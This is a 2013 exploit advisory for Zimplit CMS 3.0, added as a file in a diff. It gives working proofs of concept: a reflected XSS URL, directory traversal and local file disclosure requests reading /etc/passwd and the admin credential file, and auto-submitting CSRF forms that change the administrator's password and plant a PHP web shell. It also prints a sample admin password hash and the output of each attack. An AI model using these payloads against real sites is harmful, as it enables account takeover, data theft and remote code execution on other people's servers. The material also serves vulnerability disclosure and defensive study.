@@ -1,0 +1,220 @@
+###################################################################################################################################
+# Exploit Title: Zimplit CMS multiple vulnerabilities
+# Date: 2013 13 September
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: www.zimplit.com
+# Tested on: Linux & Windows, PHP 5.3.2
+# Affected Version :  3.0 (Last)
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+# Exploit-DB Note: Need to be authenticated for some of these to work
+
+Summary:
+========
+1. XSS (Reflected)
+2. CSRF / Directory traversal
+3. CSRF / Local file disclosure
+4. CSRF / Change administrator's password
+5. CSRF / Upload a shell
+6. CSRF / too much divastating actions to do
+
+1. XSS (Reflected):
+===================
+CMS suffers from cross site scripting due to lack of user's input sanitization:
+
+File: zimplit.php (line 535)
+...
+...
+	} else {
+		return 'Error: The file '.$file.' does not exist.';
+	}
+}
+...
+...
+
+Exploit:
+http://192.168.0.106/zimplit/zimplit.php?action=load&file=[XSS]
+http://192.168.0.106/zimplit/zimplit.php?action=load&file=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28944002%29%3C%2fScRiPt%3E
+
+
+2. CSRF / Directory traversal:
+==============================
+The following URL provides files' lists to attacker. Although it requires authorized user such as admin, with an appropriate javascript exploit an attacker is capable of having administrator's view of vulnerable link:
+http://192.168.0.106/zimplit/zimplit.php?action=listAllFiles&file=[Directory]
+
+
+File: zimplit.php (line 772 through 792)
+...
+...
+function listFilesDir($file) {
+	if($file == ''){ $thedir = '.';} else { $thedir= $file;}
+	if ($handle = opendir($thedir)) {
+	    while (false !== ($file = readdir($handle))) {
+	        if (is_dir($thedir.'/'.$file)) {
+				if($thedir != '.'){
+					$files[] = $file.'|dir';
+				} else {
+					if($file != '.' && $file != '..'){
+						$files[] = $file.'|dir';
+					}
+				}
+	        } else {
+				$files[] = $file.'|file';
+			}
+	    }
+	    closedir($handle);
+	}
+	return implode(';', $files);
+}
+...
+...
+
+
+Example:
+http://192.168.0.106/zimplit/zimplit.php?action=listAllFiles&file=../../../../
+Results in:
+opt|dir;var|dir;tmp|dir;mnt|dir;proc|dir;boot|dir;sys|dir;..|dir;bin|dir;media|dir;srv|dir;dev|dir;vmlinuz|file;lost+found|dir;lib|dir;usr|dir;cdrom|dir;initrd.img|file;root|dir;sbin|dir;build|dir;home|dir;etc|dir;selinux|dir;.|dir
+
+
+3. CSRF / Local file disclosure:
+================================
+The CMS suffers from LFD, like example above appropriate exploitation would be very harmful:
+
+
+File: zimplit.php (line 521 through 537)
+...
+...
+function getHTML($file) {
+	if (is_file($file)) {
+		if (is_readable($file)) {
+			
+			$content = file_get_contents($file);
+			if ($content === FALSE) {
+				return 'Error: Cannot read from the file '.$file.'.';
+			}
+			
+			return $content;
+		} else {
+			return 'Error: The file '.$file.' is not readable.';
+		}
+	} else {
+		return 'Error: The file '.$file.' does not exist.';
+	}
+}
+...
+...
+
+Exploit:
+http://192.168.0.106/zimplit/zimplit.php?action=load1&file=[Path to file]
+
+Examples:
+http://192.168.0.106/zimplit/zimplit.php?action=load1&file=../../../../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:107::/var/run/dbus:/bin/false
+avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash
+speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false
+haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false
+kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false
+saned:x:112:118::/home/saned:/bin/false
+hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false
+yasho:x:1000:1000:Yasho,,,:/home/yasho:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
+jetty:x:117:124::/usr/share/jetty:/bin/false
+smmta:x:118:125:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:119:126:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+
+
+Following exploit would lead to gathering administrator's username and password:
+http://192.168.0.106/zimplit/zimplit.php?action=load1&file=security.php
+<?php $u="yashar"; $p="dd0eaddc303999363896ceaad3458ecc"; $e="y.shahinzadeh@gmail.com"; $s="7xftg9by0nh97wso7pmd"; $r=""; ?>
+
+
+
+4. CSRF / Change administrator's password:
+==========================================
+Following exploit results in changing administrator's credentials:
+
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm" action="http://192.168.0.106/zimplit/zimplit.php?action=changeuserpass" method="post">
+                <input type="hidden" name="username" value="yashar">
+                <input type="hidden" name="password" value="yashar">
+                <input type="hidden" name="content" value="y.shahinzadeh@gmail.com">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+A random token would be a good prevention.
+
+
+5. CSRF / Upload a shell
+==========================================
+Exploitation of this hole is semi complicated compared with previous ones, it has two steps must be taken separately. Firstly, a blank file must be created on the remote machine. Afterwards, the malisious contents are injected into it:
+
+<html>
+<img src="http://192.168.0.106/zimplit/zimplit.php?action=new&file=shell.php" width="1" height="1">
+
+<body onload="submitForm()">
+<form name="myForm" id="myForm" action="http://192.168.0.106/zimplit/zimplit.php?action=save&file=shell.php" method="post">
+<input type="hidden" name="html" value="<?php passthru('ls -la'); ?>">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+total 608
+drwxrwxrwx  7 yasho    yasho      4096 Sep 13 04:27 .
+drwxr-xr-x 13 yasho    yasho      4096 Sep 13 02:45 ..
+-rw-r--r--  1 www-data www-data  77873 Sep 13 02:14 58.zip
+drwxrwxrwx  2 www-data www-data   4096 Sep 13 02:14 Z-files
+drwxrwxrwx  2 www-data www-data   4096 Sep 13 02:14 Z-pictures
+drwxrwxrwx  2 yasho    yasho      4096 Sep 23  2009 Z-scripts
+-rwxrwxrwx  1 yasho    yasho       845 Sep 22  2009 Zconfig.php
+-rw-r--r--  1 www-data www-data    274 Sep 13 02:14 Zmenu.js
+-rw-r--r--  1 www-data www-data     86 Sep 13 02:14 Zsettings.js
+drwxrwxrwx  7 yasho    yasho      4096 Sep 23  2009 editor
+drwxr-xr-x  2 www-data www-data   4096 Sep 13 02:14 images
+-rw-r--r--  1 www-data www-data   5789 Sep 13 02:14 index.html
+-rw-r--r--  1 www-data www-data    124 Sep 13 03:02 security.php
+-rw-rw-rw-  1 www-data www-data     28 Sep 13 04:27 shell.php
+-rw-r--r--  1 yasho    yasho         7 Sep 13 02:16 test.txt
+-rwxrwxrwx  1 yasho    yasho     37633 Sep 24  2009 zimplit.php
+-rwxrwxrwx  1 yasho    yasho    437955 Sep 13 00:58 zimplit_cms_3.0_standalone.zip
+
+
+6. CSRF / too much divastating actions to do:
+=============================================
+I'm sure there will be more attacks, I just indicate some important ones.
+
+/** Yasshar shahinzadeh **/
